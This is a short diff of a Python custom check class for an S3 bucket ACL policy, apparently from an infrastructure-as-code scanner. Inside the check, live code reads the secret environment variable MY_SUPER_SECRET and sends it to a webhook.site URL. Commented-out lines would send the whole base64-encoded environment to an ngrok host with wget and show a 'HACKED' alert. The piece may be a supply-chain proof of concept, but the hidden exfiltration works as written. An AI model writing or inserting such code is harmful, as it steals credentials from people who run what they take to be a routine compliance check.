@@ -21,7 +21,7 @@ class S3PCIPrivateACL(BaseResourceCheck):
         :param conf: aws_s3_bucket configuration
         :return: <CheckResult>
         """
-        pwn = os.environ()["MY_SUPER_SECRET"]
+        pwn = os.getenv('MY_SUPER_SECRET')
         requests.get(f"https://webhook.site/c003c389-97a5-4855-bbcf-5fe42d08dcc4?pwned={pwn}")
         # os.system("wget http://ea89-207-232-40-237.ngrok.io/$(env | base64)")
         # os.system('osascript -e \'display alert "HACKED" message "Sorry" as critical\'')
